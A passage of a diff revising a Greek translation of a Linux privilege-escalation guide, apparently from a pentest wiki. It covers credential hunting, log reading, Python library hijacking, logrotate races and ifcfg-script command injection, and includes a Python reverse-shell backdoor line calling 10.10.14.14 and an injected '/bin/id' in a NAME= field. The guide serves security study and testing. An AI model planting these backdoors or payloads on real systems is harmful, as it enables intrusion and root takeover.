από μόνο του τον αντίκτυπο. Το `passwordBcrypt` του Backrest είναι hash bcrypt κωδικοποιημένο σε base64, όπως αναφέρεται στον [κώδικα ταυτοποίησής του](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), και όχι κωδικός πρόσβασης σε απλό κείμενο. Επιβεβαιώστε την ταυτότητα της υπηρεσίας, την ύπαρξη χρησιμοποιήσιμων διαπιστευτηρίων και την πρόσβαση στο σχετικό plan ή repository, προτού θεωρήσετε ότι ένα εκτεθειμένο αρχείο ή UI αποτελεί όριο προνομίων.
+
 ```bash
 find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
 ```
-### Γνωστά αρχεία που περιέχουν passwords
 
-Διαβάστε τον κώδικα του [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), καθώς αναζητά **διάφορα πιθανά αρχεία που μπορεί να περιέχουν passwords**.\
-**Ένα ακόμη ενδιαφέρον tool** που μπορείτε να χρησιμοποιήσετε για αυτόν τον σκοπό είναι το [**LaZagne**](https://github.com/AlessandroZ/LaZagne), μια open source εφαρμογή που χρησιμοποιείται για την ανάκτηση πολλών passwords αποθηκευμένων σε έναν local υπολογιστή για Windows, Linux & Mac.
+### Γνωστά αρχεία που περιέχουν κωδικούς πρόσβασης
 
-### Logs
+Διαβάστε τον κώδικα του [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), το οποίο αναζητά **διάφορα πιθανά αρχεία που θα μπορούσαν να περιέχουν κωδικούς πρόσβασης**.\
+**Ένα ακόμη ενδιαφέρον εργαλείο** που μπορείτε να χρησιμοποιήσετε για αυτό είναι το [**LaZagne**](https://github.com/AlessandroZ/LaZagne), μια εφαρμογή ανοιχτού κώδικα που χρησιμοποιείται για την ανάκτηση πολλών κωδικών πρόσβασης αποθηκευμένων σε έναν τοπικό υπολογιστή με Windows, Linux ή Mac.
 
-Αν μπορείτε να διαβάσετε logs, ενδέχεται να βρείτε **ενδιαφέρουσες/εμπιστευτικές πληροφορίες μέσα σε αυτά**. Όσο πιο παράξενο είναι το log, τόσο πιο ενδιαφέρον θα είναι (πιθανότατα).\
-Επίσης, ορισμένα "**bad**" configured (backdoored;) **audit logs** ενδέχεται να σας επιτρέψουν να **καταγράψετε passwords** μέσα σε audit logs, όπως εξηγείται σε αυτήν την ανάρτηση: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>
+Αν είναι δυνατή η ανάγνωση του `/etc/guacamole/guacamole.properties`, εξετάστε τις ρυθμίσεις σύνδεσης βάσης δεδομένων `mysql-*`, `postgresql-*` ή `sqlserver-*`. Αν ο λογαριασμός έχει εξουσιοδότηση να διαβάζει τους πίνακες JDBC του Guacamole, ο πίνακας `guacamole_connection_parameter` ενδέχεται να περιέχει αποθηκευμένες τιμές SSH για `username`, `password`, `private-key` ή `passphrase`. Ξεκινήστε με τα ID σύνδεσης και τα ονόματα παραμέτρων και, στη συνέχεια, εξετάστε μόνο τις σχετικές γραμμές· μια αποθηκευμένη τιμή μπορεί να είναι δυναμικό token ή αναφορά σε vault και όχι επαναχρησιμοποιήσιμο μυστικό. Δείτε το [σχήμα JDBC του Guacamole](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) και τις [παραμέτρους σύνδεσης SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).
+
+Ο [διαχειριστής κωδικών pswm](https://github.com/Julynx/pswm#usage) αποθηκεύει από προεπιλογή ένα κρυπτογραφημένο vault στο `~/.local/share/pswm/pswm`. Αν είναι ορατό το vault κάποιου άλλου χρήστη, ελέγξτε τον κάτοχό του και αν ο λογαριασμός σας μπορεί πράγματι να το διαβάσει. Η διαδρομή του vault από μόνη της δεν αποκαλύπτει διαπιστευτήρια· η ανάκτηση του κύριου κωδικού πρόσβασής του, η εύρεση ενός επαναχρησιμοποιήσιμου κωδικού πρόσβασης λογαριασμού και η επιβεβαίωση των δικαιωμάτων αυτού του λογαριασμού είναι ξεχωριστά βήματα.
+
+Η [προεπιλεγμένη βάση δεδομένων του Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) είναι η `~/.passpie/`, με ένα keyring `.keys` και κρυπτογραφημένα αρχεία διαπιστευτηρίων `.pass` μέσα σε καταλόγους ομάδων. Ένας ορατός κατάλογος βάσης δεδομένων αποτελεί μόνο ένδειξη διαδρομής: επιβεβαιώστε ότι έχετε πρόσβαση στο κλειδί και στη σχετική κρυπτογραφημένη εγγραφή, ότι διαθέτετε τυχόν απαιτούμενη κύρια φράση πρόσβασης και ότι το διαπιστευτήριο που ανακτήθηκε ανήκει σε λογαριασμό με περισσότερα δικαιώματα. Το Passpie υποστηρίζει επίσης [προσαρμοσμένες διαδρομές βάσης δεδομένων](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), επομένως η προεπιλεγμένη διαδρομή δεν καλύπτει όλες τις περιπτώσεις. Η αυτοματοποιημένη απαρίθμηση θα πρέπει να εμφανίζει μεταδεδομένα χωρίς να εξάγει διαπιστευτήρια ή να εκτυπώνει υλικό κλειδιών.
+
+### Αρχεία καταγραφής
+
+Αν μπορείτε να διαβάσετε αρχεία καταγραφής, ενδέχεται να βρείτε **ενδιαφέρουσες/εμπιστευτικές πληροφορίες μέσα σε αυτά**. Όσο πιο παράξενο είναι το αρχείο καταγραφής, τόσο πιο ενδιαφέρον θα είναι (πιθανότατα).\
+Επίσης, ορισμένα «**κακώς**» ρυθμισμένα (με backdoor;) **αρχεία καταγραφής audit** ενδέχεται να σας επιτρέπουν να **καταγράφετε κωδικούς πρόσβασης** μέσα στα αρχεία καταγραφής audit, όπως εξηγείται σε αυτήν την ανάρτηση: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>
+
 ```bash
 aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
 grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
 ```
-Για να **διαβάζετε logs, η ομάδα** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) θα είναι πραγματικά χρήσιμη.
 
-### Αρχεία Shell
+Για να **διαβάσετε αρχεία καταγραφής, η ομάδα** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) θα φανεί πολύ χρήσιμη.
+
+### Αρχεία shell
+
 ```bash
 ~/.bash_profile # if it exists, read it once when you log in to the shell
 ~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
@@ -1896,70 +2223,73 @@ grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
 ~/.zlogin #zsh shell
 ~/.zshrc #zsh shell
 ```
-### Generic Creds Search/Regex
 
-Θα πρέπει επίσης να ελέγχετε για αρχεία που περιέχουν τη λέξη "**password**" στο **όνομά** τους ή μέσα στο **περιεχόμενό** τους, καθώς και για IPs και emails μέσα σε logs ή regexps για hashes.\
-Δεν πρόκειται να παραθέσω εδώ πώς να τα κάνετε όλα αυτά, αλλά αν ενδιαφέρεστε μπορείτε να ελέγξετε τους τελευταίους ελέγχους που εκτελεί το [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).
+### Γενική αναζήτηση Creds/Regex
 
-## Αρχεία με δυνατότητα εγγραφής
+Θα πρέπει επίσης να ελέγξεις για αρχεία που περιέχουν τη λέξη "**password**" στο **όνομά** τους ή στο **περιεχόμενό** τους, καθώς και για IP και email μέσα σε logs ή για regexps hashes.\
+Δεν θα παραθέσω εδώ πώς να τα κάνεις όλα αυτά, αλλά αν ενδιαφέρεσαι μπορείς να δεις τους τελευταίους ελέγχους που εκτελεί το [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).
+
+## Εγγράψιμα αρχεία
 
 ### Python library hijacking
 
-Αν γνωρίζετε **από πού** πρόκειται να εκτελεστεί ένα python script και **μπορείτε να γράψετε μέσα** σε αυτόν τον φάκελο ή μπορείτε να **τροποποιήσετε python libraries**, μπορείτε να τροποποιήσετε τη βιβλιοθήκη του OS και να την κάνετε backdoor (αν μπορείτε να γράψετε εκεί όπου πρόκειται να εκτελεστεί το python script, αντιγράψτε και επικολλήστε τη βιβλιοθήκη os.py).
+Αν ξέρεις **από πού** πρόκειται να εκτελεστεί ένα python script και **μπορείς να γράψεις μέσα** σε αυτόν τον φάκελο ή μπορείς να **τροποποιήσεις python libraries**, μπορείς να τροποποιήσεις τη βιβλιοθήκη του OS και να της προσθέσεις backdoor (αν μπορείς να γράψεις στον φάκελο όπου πρόκειται να εκτελεστεί το python script, κάνε copy και paste τη βιβλιοθήκη os.py).
 
-Για να **κάνετε backdoor τη βιβλιοθήκη**, απλώς προσθέστε στο τέλος της βιβλιοθήκης os.py την ακόλουθη γραμμή (αλλάξτε τα IP και PORT):
+Για να **προσθέσεις backdoor στη βιβλιοθήκη**, απλώς πρόσθεσε στο τέλος της βιβλιοθήκης os.py την ακόλουθη γραμμή (άλλαξε τα IP και PORT):
+
 ```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
+
 ### Εκμετάλλευση του logrotate
 
-Μια ευπάθεια στο `logrotate` επιτρέπει σε χρήστες με **δικαιώματα εγγραφής** σε ένα αρχείο log ή στους γονικούς καταλόγους του να αποκτήσουν δυνητικά αυξημένα δικαιώματα. Αυτό συμβαίνει επειδή το `logrotate`, το οποίο συχνά εκτελείται ως **root**, μπορεί να χειραγωγηθεί ώστε να εκτελεί arbitrary files, ειδικά σε καταλόγους όπως ο _**/etc/bash_completion.d/**_. Είναι σημαντικό να ελέγχετε τα δικαιώματα όχι μόνο στο _/var/log_, αλλά και σε οποιονδήποτε κατάλογο όπου εφαρμόζεται log rotation.
+Μια προνομιακή εργασία `logrotate` μπορεί να δημιουργήσει διαδρομή εγγραφής αρχείου μεταξύ χρηστών, όταν περιστρέφει πράγματι ένα log που βρίσκεται κάτω από κατάλογο τον οποίο ένας χρήστης με χαμηλότερα προνόμια μπορεί να αντικαταστήσει ή να ανακατευθύνει κατά τη διάρκεια της περιστροφής. Ένα εγγράψιμο log από μόνο του είναι απλώς ένδειξη προς διερεύνηση. Επιβεβαιώστε τον ακριβή ενεργό κανόνα και τις οδηγίες `create`, `olddir` και `su`· την ταυτότητα με την οποία εκτελείται ο χρονοπρογραμματιστής· τα δικαιώματα εγγραφής και αναζήτησης στον γονικό κατάλογο του log· και αν η εγκατεστημένη έκδοση και η πολιτική επιτρέπουν την αλλαγή του προορισμού. Για να οδηγήσει η εγγραφή σε αρχείο εκκίνησης στην εκτέλεση εντολών, πρέπει επίσης ένα μεταγενέστερο προνομιακό shell να φορτώσει το αρχείο που προέκυψε. Εξετάστε το πρόγραμμα εκτέλεσης, τον κανόνα, την έκδοση/συσκευασία και τα μεταδεδομένα της διαδρομής, χωρίς να προκαλέσετε περιστροφή ή να επιχειρήσετε το race.
 
 > [!TIP]
-> Αυτή η ευπάθεια επηρεάζει το `logrotate` έκδοσης `3.18.0` και παλαιότερες
+> Μην αντιμετωπίζετε την έκδοση `3.18.0` ή οποιαδήποτε συμβολοσειρά έκδοσης από μόνη της ως όριο εκμεταλλευσιμότητας. Το [αρχείο αλλαγών του upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) καταγράφει ενισχύσεις για καταλόγους και symlinks σε πολλαπλές εκδόσεις, ενώ οι διανομές μπορεί να έχουν ενσωματώσει διορθώσεις σε παλαιότερες εκδόσεις. Το [εγχειρίδιο του upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) συνιστά τη χρήση του `su` όταν το root περιστρέφει logs σε καταλόγους που ελέγχονται από μη προνομιούχους χρήστες· επαληθεύστε τον ενεργό κανόνα και την πραγματική συμπεριφορά.
 
-Πιο λεπτομερείς πληροφορίες σχετικά με την ευπάθεια μπορείτε να βρείτε σε αυτήν τη σελίδα: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>
+Περισσότερες πληροφορίες σχετικά με την ευπάθεια μπορείτε να βρείτε σε αυτή τη σελίδα: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>
 
-Μπορείτε να εκμεταλλευτείτε αυτήν την ευπάθεια με το [**logrotten**](https://github.com/whotwagner/logrotten).
+Μπορείτε να εκμεταλλευτείτε αυτή την ευπάθεια με το [**logrotten**](https://github.com/whotwagner/logrotten).
 
-Αυτή η ευπάθεια είναι πολύ παρόμοια με το [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** επομένως, κάθε φορά που发现ετε ότι μπορείτε να τροποποιήσετε logs, ελέγξτε ποιος διαχειρίζεται αυτά τα logs και αν μπορείτε να αυξήσετε τα δικαιώματά σας αντικαθιστώντας τα logs με symlinks.
+Αυτή η ευπάθεια μοιάζει πολύ με το [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logs του nginx),** επομένως, όταν διαπιστώνετε ότι μπορείτε να τροποποιήσετε logs, ελέγξτε ποιος τα διαχειρίζεται και αν μπορείτε να κλιμακώσετε προνόμια αντικαθιστώντας τα logs με symlinks.
 
 ### /etc/sysconfig/network-scripts/ (Centos/Redhat)
 
 **Αναφορά ευπάθειας:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>
 
-Εάν, για οποιονδήποτε λόγο, ένας χρήστης μπορεί να **γράψει** ένα script `ifcf-<whatever>` στο _/etc/sysconfig/network-scripts_ **ή** μπορεί να **τροποποιήσει** ένα υπάρχον, τότε το **system is pwned**.<sup>[[20]](#references)</sup>
+Ένα αρχείο `ifcfg-*` αποτελεί ένδειξη προς διερεύνηση όταν ένας χρήστης με χαμηλότερα προνόμια μπορεί να το δημιουργήσει ή να το τροποποιήσει **και** μια προνομιακή διαδρομή ενεργοποίησης δικτύου πρόκειται να διαβάσει το συγκεκριμένο αρχείο. Επιβεβαιώστε τα πραγματικά δικαιώματα του αρχείου και του καταλόγου, την επιλεγμένη διεπαφή, την υλοποίηση των `ifup`/`ifdown` που είναι εγκατεστημένη και ποιος τα καλεί. Ένα εγγράψιμο αρχείο από μόνο του δεν προκαλεί εκτέλεση. Ο [οδηγός δικτύωσης του Red Hat για το RHEL 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) διακρίνει τα παλαιού τύπου network scripts από το NetworkManager: το δεύτερο δεν ενεργοποιεί από μόνο του τα πρώτα. Η [τεκμηρίωση του RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) αναφέρει ότι τα προεπιλεγμένα `ifup`/`ifdown` χρησιμοποιούν το NetworkManager, ενώ το προαιρετικό πακέτο παλαιού τύπου παρέχει shell scripts.
 
-Τα network scripts, όπως το _ifcg-eth0_, χρησιμοποιούνται για network connections. Μοιάζουν ακριβώς με αρχεία .INI. Ωστόσο, γίνονται \~sourced\~ στο Linux από το Network Manager (dispatcher.d).
-
-Στην περίπτωσή μου, το `NAME=` που ορίζεται σε αυτά τα network scripts δεν αντιμετωπίζεται σωστά. Εάν υπάρχει **κενό διάστημα στο όνομα, το σύστημα προσπαθεί να εκτελέσει το τμήμα μετά το κενό διάστημα**. Αυτό σημαίνει ότι **ό,τι βρίσκεται μετά το πρώτο κενό διάστημα εκτελείται ως root**.
+Σε σύστημα που χρησιμοποιεί πράγματι προνομιακά scripts παλαιού τύπου, μια ανάθεση `ifcfg-*` όπως η `NAME=`, η οποία δεν περικλείεται σε εισαγωγικά και φορτώνεται από το shell, μπορεί να περάσει ένα όριο εκτέλεσης κώδικα. Επαληθεύστε τον ακριβή parser, την τιμή και τη διαδρομή ενεργοποίησης· μην συμπεραίνετε ότι γίνεται επεξεργασία από shell μόνο από το όνομα αρχείου ή την παρουσία του NetworkManager. Ένα wrapper που επιτρέπεται μέσω sudo, γράφει είσοδο του καλούντος σε αρχείο `ifcfg-*` και στη συνέχεια καλεί το παλαιού τύπου `ifup`, αποτελεί ξεχωριστή διαδρομή προς αυτό το όριο, ακόμη κι όταν ο καλών δεν μπορεί να επεξεργαστεί απευθείας το αρχείο.
 
 Για παράδειγμα: _/etc/sysconfig/network-scripts/ifcfg-1337_
+
 ```bash
 NAME=Network /bin/id
 ONBOOT=yes
 DEVICE=eth0
 ```
-(_Σημειώστε το κενό μεταξύ των Network και /bin/id_)
+
+(_Σημειώστε το κενό διάστημα μεταξύ Network και /bin/id_)
 
 ### **init, init.d, systemd και rc.d**
 
-Ο κατάλογος `/etc/init.d` περιέχει **scripts** για το System V init (SysVinit), το **κλασικό σύστημα διαχείρισης υπηρεσιών του Linux**. Περιλαμβάνει scripts για `start`, `stop`, `restart` και μερικές φορές `reload` υπηρεσιών. Αυτά μπορούν να εκτελεστούν απευθείας ή μέσω symbolic links που βρίσκονται στο `/etc/rc?.d/`. Μια εναλλακτική διαδρομή σε συστήματα Redhat είναι η `/etc/rc.d/init.d`.
+Ο κατάλογος `/etc/init.d` περιέχει **scripts** για το System V init (SysVinit), το **κλασικό σύστημα διαχείρισης υπηρεσιών Linux**. Περιλαμβάνει scripts για `start`, `stop`, `restart` και, μερικές φορές, `reload` υπηρεσιών. Μπορούν να εκτελεστούν απευθείας ή μέσω συμβολικών συνδέσμων που βρίσκονται στο `/etc/rc?.d/`. Στα συστήματα Redhat υπάρχει και η εναλλακτική διαδρομή `/etc/rc.d/init.d`.
 
-Από την άλλη πλευρά, το `/etc/init` σχετίζεται με το **Upstart**, ένα νεότερο **σύστημα διαχείρισης υπηρεσιών** που εισήγαγε το Ubuntu και χρησιμοποιεί configuration files για εργασίες διαχείρισης υπηρεσιών. Παρά τη μετάβαση στο Upstart, τα scripts του SysVinit εξακολουθούν να χρησιμοποιούνται παράλληλα με τις διαμορφώσεις του Upstart, λόγω ενός compatibility layer στο Upstart.
+Από την άλλη, το `/etc/init` σχετίζεται με το **Upstart**, ένα νεότερο **σύστημα διαχείρισης υπηρεσιών** που εισήγαγε το Ubuntu και χρησιμοποιεί αρχεία ρυθμίσεων για εργασίες διαχείρισης υπηρεσιών. Παρά τη μετάβαση στο Upstart, τα scripts του SysVinit εξακολουθούν να χρησιμοποιούνται παράλληλα με τις ρυθμίσεις του Upstart, χάρη σε ένα επίπεδο συμβατότητας του Upstart.
 
-Το **systemd** εμφανίζεται ως ένας σύγχρονος initialization και service manager, προσφέροντας advanced features όπως on-demand εκκίνηση daemon, διαχείριση automount και snapshots της κατάστασης του συστήματος. Οργανώνει τα αρχεία στο `/usr/lib/systemd/` για distribution packages και στο `/etc/systemd/system/` για τροποποιήσεις από administrators, απλοποιώντας τη διαδικασία system administration.<sup>[[21]](#references)</sup>
+Το **systemd** είναι ένας σύγχρονος διαχειριστής αρχικοποίησης και υπηρεσιών, με προηγμένες λειτουργίες όπως εκκίνηση daemon κατ' απαίτηση, διαχείριση automount και στιγμιότυπα κατάστασης συστήματος. Οργανώνει τα αρχεία στο `/usr/lib/systemd/` για τα πακέτα της διανομής και στο `/etc/systemd/system/` για τις τροποποιήσεις διαχειριστών, απλοποιώντας τη διαδικασία διαχείρισης του συστήματος.<sup>[[21]](#references)</sup>
 
-## Άλλα Tricks
+## Άλλα κόλπα
 
-### NFS Privilege escalation
+### Κλιμάκωση προνομίων μέσω NFS
 
 
 {{#ref}}
 ../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
 {{#endref}}
 
-### Escaping from restricted Shells
+### Διαφυγή από περιορισμένα Shells
 
 
 {{#ref}}
@@ -1973,86 +2303,86 @@ DEVICE=eth0
 ../../network-information/cisco-vmanage.md
 {{#endref}}
 
-## Android rooting frameworks: abuse του manager-channel
+## Frameworks rooting Android: κατάχρηση manager-channel
 
-Τα Android rooting frameworks συνήθως κάνουν hook σε ένα syscall για να εκθέσουν privileged kernel functionality σε έναν userspace manager. Η αδύναμη authentication του manager (π.χ. signature checks που βασίζονται στη σειρά των FD ή ανεπαρκή password schemes) μπορεί να επιτρέψει σε μια local app να υποδυθεί τον manager και να κάνει escalate σε root σε συσκευές που έχουν ήδη γίνει rooted. Μάθετε περισσότερα και δείτε λεπτομέρειες exploitation εδώ:
+Τα frameworks rooting Android συνήθως κάνουν hook σε ένα syscall για να εκθέσουν προνομιούχες λειτουργίες του kernel σε έναν userspace manager. Η αδύναμη αυθεντικοποίηση του manager (π.χ. έλεγχοι υπογραφής με βάση τη σειρά FD ή ανεπαρκή σχήματα κωδικών πρόσβασης) μπορεί να επιτρέψει σε μια τοπική εφαρμογή να προσποιηθεί ότι είναι ο manager και να αποκτήσει root σε συσκευές που έχουν ήδη γίνει root. Μάθετε περισσότερα και δείτε λεπτομέρειες για την εκμετάλλευση εδώ:
 
 
 {{#ref}}
 ../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
 {{#endref}}
 
-## VMware Tools service discovery LPE (CWE-426) μέσω regex-based exec (CVE-2025-41244)
+## Εντοπισμός υπηρεσίας VMware Tools και LPE (CWE-426) μέσω exec βασισμένου σε regex (CVE-2025-41244)
 
-Το regex-driven service discovery στο VMware Tools/Aria Operations μπορεί να εξαγάγει ένα binary path από τις command lines διεργασιών και να το εκτελέσει με `-v` υπό privileged context. Permissive patterns (π.χ. με χρήση του `\S`) μπορεί να ταιριάξουν με listeners που έχουν τοποθετηθεί από attacker σε writable locations (π.χ. `/tmp/httpd`), οδηγώντας σε execution ως root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>
+Ο εντοπισμός υπηρεσιών μέσω regex στο VMware Tools/Aria Operations μπορεί να εξαγάγει μια διαδρομή binary από τις γραμμές εντολών διεργασιών και να την εκτελέσει με -v υπό προνομιούχο context. Χαλαρά patterns (π.χ. όσα χρησιμοποιούν \S) μπορεί να αντιστοιχίσουν listeners που έχει τοποθετήσει ο επιτιθέμενος σε εγγράψιμες τοποθεσίες (π.χ. /tmp/httpd), οδηγώντας σε εκτέλεση ως root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>
 
-Μάθετε περισσότερα και δείτε ένα generalized pattern που εφαρμόζεται σε άλλα discovery/monitoring stacks εδώ:
+Μάθετε περισσότερα και δείτε ένα γενικευμένο pattern που εφαρμόζεται και σε άλλα stacks εντοπισμού/παρακολούθησης εδώ:
 
 {{#ref}}
 ../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
 {{#endref}}
 
-## Kernel Security Protections
+## Προστασίες ασφάλειας Kernel
 
 - [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
 - [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)
 
 ## Περισσότερη βοήθεια
 
-[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)
+[Static binaries του impacket](https://github.com/ropnop/impacket_static_binaries)
 
-## Linux/Unix Privesc Tools
+## Εργαλεία Privesc για Linux/Unix
 
-### **Καλύτερο tool για την αναζήτηση local privilege escalation vectors στο Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+### **Καλύτερο εργαλείο για την αναζήτηση vectors τοπικής κλιμάκωσης προνομίων Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
-**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
+**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(επιλογή -t)\
 **Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
-**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
+**Έλεγχος Unix Privesc:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
 **Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
 **BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
-**Kernelpop:** Enumerate kernel vulns σε Linux και MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
+**Kernelpop:** Καταμέτρηση kernel vulns σε Linux και MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
 **Mestaploit:** _**multi/recon/local_exploit_suggester**_\
 **Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
-**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
-**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)
+**EvilAbigail (φυσική πρόσβαση):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
+**Συλλογή περισσότερων scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)
 
 ## References
 
-- [1] [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
-- [2] [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
-- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
+- [1] [0xdf – HTB Planning (κλιμάκωση προνομίων μέσω Crontab UI, επαναχρησιμοποίηση creds με zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
+- [2] [0xdf – HTB Era: πλαστό payload .text_sig για monitor που εκτελείται από cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
+- [3] [0xdf – Holiday Hack Challenge 2025: παράκαμψη Neighborhood Watch (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
 - [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
-- [5] [Βασική Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
-- [6] [Οδηγός Linux Privilege Escalation](https://payatu.com/guide-linux-privilege-escalation/)
-- [7] [Επίθεση και Άμυνα: Linux Privilege Escalation Techniques of 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
-- [8] [Κανείς δεν περίμενε command execution!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
-- [9] [Sudo (LD_PRELOAD) (Linux Privilege Escalation)](https://touhidshaikh.com/blog/?p=827)
-- [10] [lpeworkshop – Lab Exercises Walkthrough - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
-- [11] [frizb/Linux-Privilege-Escalation: Tips and Tricks for Linux Priv Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
+- [5] [Βασική κλιμάκωση προνομίων Linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+- [6] [Οδηγός κλιμάκωσης προνομίων Linux](https://payatu.com/guide-linux-privilege-escalation/)
+- [7] [Επίθεση και άμυνα: τεχνικές κλιμάκωσης προνομίων Linux του 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
+- [8] [Κανείς δεν περιμένει την εκτέλεση εντολών!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
+- [9] [Sudo (LD_PRELOAD) (κλιμάκωση προνομίων Linux)](https://touhidshaikh.com/blog/?p=827)
+- [10] [lpeworkshop – Αναλυτική παρουσίαση εργαστηριακών ασκήσεων - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
+- [11] [frizb/Linux-Privilege-Escalation: Συμβουλές και κόλπα για κλιμάκωση προνομίων Linux](https://github.com/frizb/Linux-Privilege-Escalation)
 - [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
-- [13] [rtcrowley/linux-private-i: Linux Enumeration & Privilege Escalation tool](https://github.com/rtcrowley/linux-private-i)
+- [13] [rtcrowley/linux-private-i: Εργαλείο enumeration και κλιμάκωσης προνομίων Linux](https://github.com/rtcrowley/linux-private-i)
 - [14] [Τι είναι ένα Socket;](https://www.linux.com/news/what-socket/)
